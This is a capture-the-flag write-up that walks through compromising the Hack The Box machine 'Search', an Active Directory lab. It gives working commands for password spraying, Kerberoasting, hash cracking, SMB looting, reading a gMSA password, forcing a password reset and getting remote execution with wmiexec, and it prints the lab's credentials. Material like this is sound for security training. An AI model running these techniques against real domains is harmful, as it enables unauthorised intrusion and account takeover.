# [Search](https://app.hackthebox.com/machines/search/)

```bash
nmap -p- --min-rate 10000 10.10.11.129 -Pn
```

![alt text](img/image.png)

After detection of open ports, let's do greater scan for these ports.

```bash
nmap -A -sC -sV -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,9389 10.10.11.129 -Pn 
```

![alt text](img/image-1.png)

From nmap scan results, I see that I need to add `search.htb`,`research.search.htb` domains into `/etc/hosts` file for resolving purposes.


Let's do `Directory Enumeration` via `gobuster` command.
```bash
gobuster dir -u http://10.10.11.129/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 40
```

![alt text](img/image-22.png)

While opening web application, I see such thing.

![alt text](img/image-2.png)


While looking at images of web application closely , I mean `zoom`, I can see password on notebook.

![alt text](img/image-3.png)

Password: IsolationIsKey?


From above this password, I see person name as `Hope Sharp`. Let's genereate possible domain users via this username and lastname.
```bash
hope
sharp
h.sharp
hope.s
hope.sharp
hopesharp
```


Let's brute-force for these usernames via one password, means `Password Spray` attack.
```bash
crackmapexec smb 10.10.11.129 -u pos_usernames.txt -p IsolationIsKey? --continue-on-success
```

![alt text](img/image-4.png)


Success, we found credentials already.

hope.sharp:IsolationIsKey?


Via this domain user, let's do `Kerberoasting` attack by using `GetUserSPNs.py` script of `Impacket` module.
```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.11.129 search.htb/hope.sharp
```

![alt text](img/image-5.png)


Let's crack this hash via `hashcat` command.
```bash
hashcat -m 13100 hash.txt --wordlist /usr/share/wordlists/rockyou.txt
```

![alt text](img/image-6.png)

web_svc: @3ONEmillionbaby


Let's check this credentials via `crackmapexec` command.
```bash
crackmapexec smb 10.10.11.129 -u web_svc -p '@3ONEmillionbaby'
```

![alt text](img/image-7.png)


Let's look at `Domain Users` via script called `GetADUsers.py` of `Impacket` module.
```bash
python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -dc-ip 10.10.11.129 search.htb/web_svc:@3ONEmillionbaby -all
```

![alt text](img/image-8.png)



Let's parse this users via `space` delimeter.
```bash
python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -dc-ip 10.10.11.129 search.htb/web_svc:@3ONEmillionbaby -all | cut -d " " -f1
```

After this, let's do `Password Spray` attack for these users for password `@3ONEmillionbaby` by using `crackmapexec` command.
```bash
crackmapexec smb 10.10.11.129 -u users.txt -p '@3ONEmillionbaby' --continue-on-success
```

![alt text](img/image-9.png)


Edgar.Jacobs: @3ONEmillionbaby

Let's check `SMB` shares via this credentials.
```bash
smbmap -H 10.10.11.129 -u Edgar.Jacobs -p '@3ONEmillionbaby'
```

![alt text](img/image-10.png)


Let's access to `RedirectedFolders$` share via `smbclient` command.
```bash
smbclient -U '10.10.11.129\Edgar.Jacobs' //10.10.11.129/RedirectedFolders$
```

![alt text](img/image-11.png)


While accessing to `SMB` share, I find `.xlsx` file and try to read this.

As this is also `compressed` files, we can `unzip` this.

![alt text](img/image-12.png)


I found already `SHA-512` hash value via salt of this from `sheet2.xml`.

![alt text](img/image-13.png)


I read passwords of users.

![alt text](img/image-14.png)


Let's check this usernames and passwords of them.
```bash
crackmapexec smb 10.10.11.129 -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18'
```

![alt text](img/image-15.png)


Via this user credentials, let's check `SMB` shares via `smbmap` command.
```bash
smbmap -H 10.10.11.129 -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18'
```

![alt text](img/image-16.png)


Let's go into `SMB` share called `RedirectedFolders$` via this credentials.
```bash
smbclient -U '10.10.11.129\Sierra.Frye' //10.10.11.129/RedirectedFolders$
```

user.txt

![alt text](img/image-17.png)

![alt text](img/image-18.png)


On this user's `Downloads/backups` directory, I found `.pfx` and `.p12` files.

![alt text](img/image-19.png)


Let's download and convert them from their formats into `crackable` formats by using `pfx2john` command.

![alt text](img/image-20.png)

Let's crack them via `john` command.
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![alt text](img/image-21.png)


Cert's Password: misspissy

After this we can upload this certificates into our browser to see `Forbidden` pages of target, For example we can see `/staff` endpoint.

![alt text](img/image-23.png)

Now, we can see `/staff` endpoint.

![alt text](img/image-24.png)


We can access into here via our domain credentials. But I wrote `IP Address`, it doesn't connect that's why I wrote just `research` due to result of `crackmapexec` and it worked.

![alt text](img/image-25.png)


user.txt

![alt text](img/image-26.png)


Let's run `bloodhound-python` via our domain credentials.
```bash
bloodhound-python -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb -c All -ns 10.10.11.129
```

![alt text](img/image-27.png)


Let's run our commands to up `bloodhound`.
```bash
neo4j console
bloodhound
```

![alt text](img/image-28.png)


From this enumeration, I see that for `Sierra.Frye` user has privilege for `ReadGMSAPassword`

![alt text](img/image-29.png)



For abusing this, I looked at this [article](https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/)


Exploit code is such below.
```bash
$gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp
(ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
$password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
$SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
```


![alt text](img/image-30.png)

As we have already full control, we can reset passwords of some users.
```bash
$cred = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $SecPass
Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Dr4ks1234!' -force)} -Credential $cred
```

![alt text](img/image-31.png)


Let's join into machine via `wmiexec.py` script of `Impacket` module.
```bash
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py 'search/tristan.davies:Dr4ks1234!@10.10.11.129'
```


root.txt

![alt text](img/image-32.png)